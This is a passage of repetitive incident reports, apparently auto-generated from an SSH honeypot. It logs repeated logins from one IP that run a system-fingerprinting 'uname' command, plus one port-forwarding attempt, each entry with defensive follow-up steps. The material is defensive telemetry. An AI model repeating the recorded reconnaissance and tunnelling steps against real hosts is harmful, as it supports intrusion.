| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:48 |
| **Last Seen** | 2026-09-20 16:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:48:54` | `cowrie.session.connect` |
| `2026-09-20 16:48:54` | `cowrie.client.version` |
| `2026-09-20 16:48:54` | `cowrie.client.kex` |
| `2026-09-20 16:48:55` | `cowrie.login.success` |
| `2026-09-20 16:48:56` | `cowrie.session.params` |
| `2026-09-20 16:48:56` | `cowrie.command.input` |
| `2026-09-20 16:48:56` | `cowrie.log.closed` |
| `2026-09-20 16:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcff0d28ec82

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:00` | `cowrie.session.connect` |
| `2026-09-20 16:49:00` | `cowrie.client.version` |
| `2026-09-20 16:49:00` | `cowrie.client.kex` |
| `2026-09-20 16:49:01` | `cowrie.login.success` |
| `2026-09-20 16:49:02` | `cowrie.session.params` |
| `2026-09-20 16:49:02` | `cowrie.command.input` |
| `2026-09-20 16:49:02` | `cowrie.log.closed` |
| `2026-09-20 16:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e25cab5d0f0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:05` | `cowrie.session.connect` |
| `2026-09-20 16:49:06` | `cowrie.client.version` |
| `2026-09-20 16:49:06` | `cowrie.client.kex` |
| `2026-09-20 16:49:07` | `cowrie.login.success` |
| `2026-09-20 16:49:07` | `cowrie.session.params` |
| `2026-09-20 16:49:07` | `cowrie.command.input` |
| `2026-09-20 16:49:08` | `cowrie.log.closed` |
| `2026-09-20 16:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35f24e0a2bd6

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:11` | `cowrie.session.connect` |
| `2026-09-20 16:49:11` | `cowrie.client.version` |
| `2026-09-20 16:49:11` | `cowrie.client.kex` |
| `2026-09-20 16:49:12` | `cowrie.login.success` |
| `2026-09-20 16:49:13` | `cowrie.session.params` |
| `2026-09-20 16:49:13` | `cowrie.command.input` |
| `2026-09-20 16:49:13` | `cowrie.log.closed` |
| `2026-09-20 16:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a219c44f296

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:17` | `cowrie.session.connect` |
| `2026-09-20 16:49:17` | `cowrie.client.version` |
| `2026-09-20 16:49:17` | `cowrie.client.kex` |
| `2026-09-20 16:49:18` | `cowrie.login.success` |
| `2026-09-20 16:49:18` | `cowrie.session.params` |
| `2026-09-20 16:49:18` | `cowrie.command.input` |
| `2026-09-20 16:49:19` | `cowrie.log.closed` |
| `2026-09-20 16:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d22a964d031

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:22` | `cowrie.session.connect` |
| `2026-09-20 16:49:22` | `cowrie.client.version` |
| `2026-09-20 16:49:22` | `cowrie.client.kex` |
| `2026-09-20 16:49:23` | `cowrie.login.success` |
| `2026-09-20 16:49:24` | `cowrie.session.params` |
| `2026-09-20 16:49:24` | `cowrie.command.input` |
| `2026-09-20 16:49:24` | `cowrie.log.closed` |
| `2026-09-20 16:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c971121ee2f1

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:29` | `cowrie.session.connect` |
| `2026-09-20 16:49:29` | `cowrie.client.version` |
| `2026-09-20 16:49:29` | `cowrie.client.kex` |
| `2026-09-20 16:49:29` | `cowrie.login.success` |
| `2026-09-20 16:49:30` | `cowrie.session.params` |
| `2026-09-20 16:49:30` | `cowrie.command.input` |
| `2026-09-20 16:49:31` | `cowrie.log.closed` |
| `2026-09-20 16:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35ca59c0d604

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:33` | `cowrie.session.connect` |
| `2026-09-20 16:49:33` | `cowrie.client.version` |
| `2026-09-20 16:49:33` | `cowrie.client.kex` |
| `2026-09-20 16:49:34` | `cowrie.login.success` |
| `2026-09-20 16:49:35` | `cowrie.session.params` |
| `2026-09-20 16:49:35` | `cowrie.command.input` |
| `2026-09-20 16:49:35` | `cowrie.log.closed` |
| `2026-09-20 16:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54a0ac8b7a2

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:39` | `cowrie.session.connect` |
| `2026-09-20 16:49:39` | `cowrie.client.version` |
| `2026-09-20 16:49:39` | `cowrie.client.kex` |
| `2026-09-20 16:49:39` | `cowrie.login.success` |
| `2026-09-20 16:49:40` | `cowrie.session.params` |
| `2026-09-20 16:49:40` | `cowrie.command.input` |
| `2026-09-20 16:49:40` | `cowrie.log.closed` |
| `2026-09-20 16:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0d671e5e883

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:45` | `cowrie.session.connect` |
| `2026-09-20 16:49:45` | `cowrie.client.version` |
| `2026-09-20 16:49:45` | `cowrie.client.kex` |
| `2026-09-20 16:49:45` | `cowrie.login.success` |
| `2026-09-20 16:49:46` | `cowrie.session.params` |
| `2026-09-20 16:49:46` | `cowrie.command.input` |
| `2026-09-20 16:49:46` | `cowrie.log.closed` |
| `2026-09-20 16:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5b690ac43fd

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:51` | `cowrie.session.connect` |
| `2026-09-20 16:49:51` | `cowrie.client.version` |
| `2026-09-20 16:49:51` | `cowrie.client.kex` |
| `2026-09-20 16:49:51` | `cowrie.login.success` |
| `2026-09-20 16:49:52` | `cowrie.session.params` |
| `2026-09-20 16:49:52` | `cowrie.command.input` |
| `2026-09-20 16:49:52` | `cowrie.log.closed` |
| `2026-09-20 16:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e5250ee5757

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:49 |
| **Last Seen** | 2026-09-20 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:49:56` | `cowrie.session.connect` |
| `2026-09-20 16:49:56` | `cowrie.client.version` |
| `2026-09-20 16:49:56` | `cowrie.client.kex` |
| `2026-09-20 16:49:56` | `cowrie.login.success` |
| `2026-09-20 16:49:57` | `cowrie.session.params` |
| `2026-09-20 16:49:57` | `cowrie.command.input` |
| `2026-09-20 16:49:58` | `cowrie.log.closed` |
| `2026-09-20 16:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06645d80eee5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:01` | `cowrie.session.connect` |
| `2026-09-20 16:50:01` | `cowrie.client.version` |
| `2026-09-20 16:50:01` | `cowrie.client.kex` |
| `2026-09-20 16:50:02` | `cowrie.login.success` |
| `2026-09-20 16:50:03` | `cowrie.session.params` |
| `2026-09-20 16:50:03` | `cowrie.command.input` |
| `2026-09-20 16:50:03` | `cowrie.log.closed` |
| `2026-09-20 16:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd831b347285

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:07` | `cowrie.session.connect` |
| `2026-09-20 16:50:07` | `cowrie.client.version` |
| `2026-09-20 16:50:07` | `cowrie.client.kex` |
| `2026-09-20 16:50:07` | `cowrie.login.success` |
| `2026-09-20 16:50:08` | `cowrie.session.params` |
| `2026-09-20 16:50:08` | `cowrie.command.input` |
| `2026-09-20 16:50:08` | `cowrie.log.closed` |
| `2026-09-20 16:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2052b93c89b9

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:12` | `cowrie.session.connect` |
| `2026-09-20 16:50:12` | `cowrie.client.version` |
| `2026-09-20 16:50:12` | `cowrie.client.kex` |
| `2026-09-20 16:50:12` | `cowrie.login.success` |
| `2026-09-20 16:50:13` | `cowrie.session.params` |
| `2026-09-20 16:50:13` | `cowrie.command.input` |
| `2026-09-20 16:50:13` | `cowrie.log.closed` |
| `2026-09-20 16:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76eb87c4b845

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:17` | `cowrie.session.connect` |
| `2026-09-20 16:50:17` | `cowrie.client.version` |
| `2026-09-20 16:50:17` | `cowrie.client.kex` |
| `2026-09-20 16:50:18` | `cowrie.login.success` |
| `2026-09-20 16:50:19` | `cowrie.session.params` |
| `2026-09-20 16:50:19` | `cowrie.command.input` |
| `2026-09-20 16:50:19` | `cowrie.log.closed` |
| `2026-09-20 16:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c72d25e095b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:23` | `cowrie.session.connect` |
| `2026-09-20 16:50:23` | `cowrie.client.version` |
| `2026-09-20 16:50:23` | `cowrie.client.kex` |
| `2026-09-20 16:50:23` | `cowrie.login.success` |
| `2026-09-20 16:50:24` | `cowrie.session.params` |
| `2026-09-20 16:50:24` | `cowrie.command.input` |
| `2026-09-20 16:50:24` | `cowrie.log.closed` |
| `2026-09-20 16:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd2df20782c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:27` | `cowrie.session.connect` |
| `2026-09-20 16:50:27` | `cowrie.client.version` |
| `2026-09-20 16:50:27` | `cowrie.client.kex` |
| `2026-09-20 16:50:28` | `cowrie.login.success` |
| `2026-09-20 16:50:28` | `cowrie.direct-tcpip.request` |
| `2026-09-20 16:50:28` | `cowrie.direct-tcpip.data` |
| `2026-09-20 16:50:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eaf5934c89f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:28` | `cowrie.session.connect` |
| `2026-09-20 16:50:29` | `cowrie.client.version` |
| `2026-09-20 16:50:29` | `cowrie.client.kex` |
| `2026-09-20 16:50:29` | `cowrie.login.success` |
| `2026-09-20 16:50:30` | `cowrie.session.params` |
| `2026-09-20 16:50:30` | `cowrie.command.input` |
| `2026-09-20 16:50:30` | `cowrie.log.closed` |
| `2026-09-20 16:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26216077c2a4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:34` | `cowrie.session.connect` |
| `2026-09-20 16:50:34` | `cowrie.client.version` |
| `2026-09-20 16:50:34` | `cowrie.client.kex` |
| `2026-09-20 16:50:34` | `cowrie.login.success` |
| `2026-09-20 16:50:35` | `cowrie.session.params` |
| `2026-09-20 16:50:35` | `cowrie.command.input` |
| `2026-09-20 16:50:35` | `cowrie.log.closed` |
| `2026-09-20 16:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08fba59e3ce0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:39` | `cowrie.session.connect` |
| `2026-09-20 16:50:39` | `cowrie.client.version` |
| `2026-09-20 16:50:39` | `cowrie.client.kex` |
| `2026-09-20 16:50:40` | `cowrie.login.success` |
| `2026-09-20 16:50:41` | `cowrie.session.params` |
| `2026-09-20 16:50:41` | `cowrie.command.input` |
| `2026-09-20 16:50:41` | `cowrie.log.closed` |
| `2026-09-20 16:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d205c201570a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:45` | `cowrie.session.connect` |
| `2026-09-20 16:50:45` | `cowrie.client.version` |
| `2026-09-20 16:50:45` | `cowrie.client.kex` |
| `2026-09-20 16:50:46` | `cowrie.login.success` |
| `2026-09-20 16:50:46` | `cowrie.session.params` |
| `2026-09-20 16:50:46` | `cowrie.command.input` |
| `2026-09-20 16:50:47` | `cowrie.log.closed` |
| `2026-09-20 16:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e5bd97d3125

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:51` | `cowrie.session.connect` |
| `2026-09-20 16:50:51` | `cowrie.client.version` |
| `2026-09-20 16:50:51` | `cowrie.client.kex` |
| `2026-09-20 16:50:51` | `cowrie.login.success` |
| `2026-09-20 16:50:52` | `cowrie.session.params` |
| `2026-09-20 16:50:52` | `cowrie.command.input` |
| `2026-09-20 16:50:52` | `cowrie.log.closed` |
| `2026-09-20 16:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f813d5b81619

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:50 |
| **Last Seen** | 2026-09-20 16:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:50:56` | `cowrie.session.connect` |
| `2026-09-20 16:50:56` | `cowrie.client.version` |
| `2026-09-20 16:50:56` | `cowrie.client.kex` |
| `2026-09-20 16:50:57` | `cowrie.login.success` |
| `2026-09-20 16:50:58` | `cowrie.session.params` |
| `2026-09-20 16:50:58` | `cowrie.command.input` |
| `2026-09-20 16:50:58` | `cowrie.log.closed` |
| `2026-09-20 16:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d575dbc616b6

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:02` | `cowrie.session.connect` |
| `2026-09-20 16:51:02` | `cowrie.client.version` |
| `2026-09-20 16:51:02` | `cowrie.client.kex` |
| `2026-09-20 16:51:02` | `cowrie.login.success` |
| `2026-09-20 16:51:03` | `cowrie.session.params` |
| `2026-09-20 16:51:03` | `cowrie.command.input` |
| `2026-09-20 16:51:03` | `cowrie.log.closed` |
| `2026-09-20 16:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]61` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d773ef6a0fc

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]61` |
| **First Seen** | 2026-09-20 16:51 |
| **Last Seen** | 2026-09-20 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:51:07` | `cowrie.session.connect` |
| `2026-09-20 16:51:07` | `cowrie.client.version` |
| `2026-09-20 16:51:07` | `cowrie.client.kex` |
| `2026-09-20 16:51:08` | `cowrie.login.success` |
| `2026-09-20 16:51:08` | `cowrie.session.params` |
